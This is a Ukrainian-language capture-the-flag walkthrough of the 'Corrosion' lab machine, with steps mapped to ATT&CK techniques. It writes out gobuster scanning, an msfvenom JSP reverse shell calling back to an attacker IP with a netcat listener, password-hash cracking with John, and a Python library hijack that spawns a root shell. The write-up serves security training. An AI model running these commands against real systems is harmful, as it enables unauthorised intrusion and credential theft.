# Corrosion

### 1. Network Service Discovery(T1046)

Для початку шукаємо машину i дослiджуємо вiдкритi порти

<img width="647" height="143" alt="image" src="https://github.com/user-attachments/assets/a4cbb297-2b54-4913-a280-89fb59e4e2d3" />

Знайшли IP: 10.0.2.6

<img width="777" height="382" alt="image" src="https://github.com/user-attachments/assets/e0071116-dc38-427a-a55a-0efa15c21d6f" />

Бачимо ssh i два порти http: 80 i 8080. Переглянемо порт 80:

<img width="822" height="722" alt="image" src="https://github.com/user-attachments/assets/b1c94ccf-2d12-43fc-856d-28516d09c8d3" />

Порт 8080:

<img width="1040" height="718" alt="image" src="https://github.com/user-attachments/assets/13dd9191-3d1d-49a4-8411-013572db115a" />

### 2. Gather Victim Host Information(T1592), Password Cracking(T1110.002), Credentials in Configuration Files(T1552.003)

Проскануємо оба порти за допомогою gobuster:

```bash
gobuster dir -u http://10.0.2.6:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip,.php
```

На портi 80 нiчого цiкавого. Скануємо порт 8080 i одразу знаходимо:

<img width="398" height="51" alt="image" src="https://github.com/user-attachments/assets/8a0ff4ed-ee3d-4ca5-8938-16ce2539657e" />

Завантажимо:

<img width="409" height="181" alt="image" src="https://github.com/user-attachments/assets/c650345e-9c9b-444f-8c3a-0634b2f59243" />

Потребуємо пароль, спробуємо пiдiбрати:

<img width="720" height="94" alt="image" src="https://github.com/user-attachments/assets/f0b47bbb-b375-4a6f-a06e-35871c4ab05a" />

Знайшли!

### 3. Valid Accounts(T1078), Exploitation for Web Service(T1190), Remote Services(T1021)

В файлах знаходимо логiн i пароль адмiнiстратора:

<img width="770" height="101" alt="image" src="https://github.com/user-attachments/assets/04423f5d-c46d-46b0-9a28-c673b360aff3" />

Спробуємо увiйти:

<img width="1920" height="659" alt="image" src="https://github.com/user-attachments/assets/ddbd48ac-418f-4b0d-af7b-82419f945959" />

Працює!

Тепер створимо reverse shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.4 LPORT=12345 -f war -o revshell.war
```

<img width="380" height="72" alt="image" src="https://github.com/user-attachments/assets/43aa540e-e223-41f2-b396-fb08f5d54417" />

```bash
nc -lvnp 12345
```

Переходимо в 10.0.2.6:8080/revshell i бачимо:

<img width="454" height="98" alt="image" src="https://github.com/user-attachments/assets/03f38982-1db0-4724-af52-cce54a4cf756" />

Маємо shell!

### 4. Discovery: File and Directory Discovery(T1083), OS Credential Dumping(T1003), Brute Force(T1110)

Одразу покращимо середовище:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<img width="398" height="43" alt="image" src="https://github.com/user-attachments/assets/c02319ce-fa3a-48ba-b064-d09334660f60" />

Знаходимо цiкавi файли у директорiї /home/randy:

<img width="861" height="192" alt="image" src="https://github.com/user-attachments/assets/6c06db24-1516-4d54-8546-5b0a2d28534c" />

Доступу до директорiї iншого користувача немає. Спробуємо використати пароль вiд tomcat в надiї, що спрацює:

<img width="660" height="422" alt="image" src="https://github.com/user-attachments/assets/ef576c2b-50c8-41b9-9fd9-e56de74920ba" />

Вдалося!

Шукаємо щось, що може нам допомогти i знаходимо:

<img width="408" height="101" alt="image" src="https://github.com/user-attachments/assets/7036c1d2-d006-483a-8aa0-cc5fe2995b85" />

Маємо доступ до команди look з root-правами!

Спробуємо отримати хеши паролiв i зламати їх. Це вдається, зберiгаємо:

<img width="899" height="106" alt="image" src="https://github.com/user-attachments/assets/acdc2379-393c-4f43-bc5e-1aceef3f954f" />

Нам потрiбен randy, тому копiюємо до окремого файлу hash.txt. Запускаємо JohnTheRipper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<img width="160" height="24" alt="image" src="https://github.com/user-attachments/assets/cc8a1017-cb2c-4381-be87-aa31715fd2e5" />

Отримали пароль! Повертаємося до ssh-сесiї:

```bash
su randy
```

<img width="348" height="77" alt="image" src="https://github.com/user-attachments/assets/330069d7-e087-4f93-acb8-d78043076b2e" />

Перевiримо права:

<img width="758" height="140" alt="image" src="https://github.com/user-attachments/assets/64ce9d2a-89c5-4e04-b0b5-f37d93e0b5ea" />

Можемо запускати randombase64.py як root. Це можливiсть захопити бiблiотеку i отримати root

### 5. Hijack Execution Flow: DLL/Library Injection(T1574), Privilege Escalation(T1068)

randombase64.py використовує бiблiотеку base64

<img width="425" height="141" alt="image" src="https://github.com/user-attachments/assets/387da64c-20fe-4acd-a882-5856ae0dc1dd" />

Знаходимо i вiдкриваємо base64.py

<img width="679" height="411" alt="image" src="https://github.com/user-attachments/assets/43a04932-267a-48ec-9209-3e647c8ed3d0" />

Вставляємо цей код:

```bash
import os
os.system("/bin/bash")
```

Запускаємо:

<img width="600" height="57" alt="image" src="https://github.com/user-attachments/assets/eb0fc7ad-0d0a-487b-973c-357eadc56b9a" />

Шукаємо флаг:

<img width="393" height="54" alt="image" src="https://github.com/user-attachments/assets/4a9b43f2-a7d6-413f-ab8d-53fe142a8eb8" />

# Перемога!

<img width="640" height="619" alt="image" src="https://github.com/user-attachments/assets/3e39cd09-ef04-4f3b-a942-2942512f573f" />
